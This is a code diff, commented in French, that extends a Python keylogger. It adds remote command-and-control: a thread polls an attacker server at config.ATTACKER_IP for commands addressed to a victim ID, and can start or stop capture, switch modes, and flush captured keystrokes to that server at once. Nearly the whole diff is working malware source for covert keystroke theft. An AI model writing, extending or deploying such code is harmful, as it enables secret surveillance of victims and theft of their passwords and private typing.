@@ -258,6 +258,88 @@ class Keylogger:
         self.mode = new_mode
         print(f"[+] Mode changé vers: {new_mode}")
     
+    def flush_logs(self):
+        """
+        Vide la queue de logs et envoie immédiatement tous les logs en attente
+        """
+        logs_to_send = []
+        
+        # Collecter tous les logs de la queue
+        while not self.log_queue.empty():
+            logs_to_send.append(self.log_queue.get())
+        
+        # Ajouter les logs du buffer
+        if self.buffer:
+            logs_to_send.extend(self.buffer)
+            self.buffer = []
+        
+        if logs_to_send:
+            print(f"[+] Envoi immédiat de {len(logs_to_send)} logs...")
+            self.send_logs(logs_to_send)
+            print(f"[+] {len(logs_to_send)} logs envoyés")
+        else:
+            print("[!] Aucun log à envoyer")
+    
+    def execute_command(self, command, params=None):
+        """
+        Exécute une commande reçue du serveur
+        """
+        try:
+            if command == "start_capture":
+                self.start_capture()
+            
+            elif command == "stop_capture":
+                self.stop_capture()
+            
+            elif command == "switch_mode":
+                mode = params.get('mode') if params else None
+                if mode:
+                    self.switch_mode(mode)
+                else:
+                    print("[-] Paramètre 'mode' manquant pour switch_mode")
+            
+            elif command == "flush_logs":
+                self.flush_logs()
+            
+            else:
+                print(f"[-] Commande inconnue: {command}")
+        
+        except Exception as e:
+            print(f"[-] Erreur lors de l'exécution de la commande {command}: {e}")
+    
+    def check_commands_thread(self):
+        """
+        Thread qui vérifie périodiquement les commandes en attente sur le serveur
+        """
+        while True:
+            try:
+                time.sleep(5)  # Vérifier toutes les 5 secondes
+                
+                # Récupérer les commandes depuis le serveur
+                try:
+                    response = requests.get(
+                        f"http://{config.ATTACKER_IP}:{config.ATTACKER_PORT}/victims/{self.victim_id}/commands",
+                        timeout=3
+                    )
+                    
+                    if response.status_code == 200:
+                        data = response.json()
+                        commands = data.get('commands', [])
+                        
+                        # Exécuter chaque commande
+                        for cmd in commands:
+                            command = cmd.get('command')
+                            params = cmd.get('params', {})
+                            print(f"[+] Commande reçue: {command}")
+                            self.execute_command(command, params)
+                
+                except requests.exceptions.RequestException:
+                    # Erreur de connexion, on continue
+                    pass
+            
+            except Exception as e:
+                print(f"[-] Erreur dans check_commands_thread: {e}")
+    
     def run(self):
         """
         Lance le keylogger
@@ -266,10 +348,15 @@ class Keylogger:
         sender = Thread(target=self.sender_thread, daemon=True)
         sender.start()
         
+        # Démarrer le thread de vérification des commandes
+        command_checker = Thread(target=self.check_commands_thread, daemon=True)
+        command_checker.start()
+        
         # Démarrer la capture automatiquement
         self.start_capture()
         
         print("[+] Keylogger actif. Appuyez sur Ctrl+C pour arrêter.")
+        print("[+] Écoute des commandes distantes activée")
         
         try:
             # Écouter les frappes
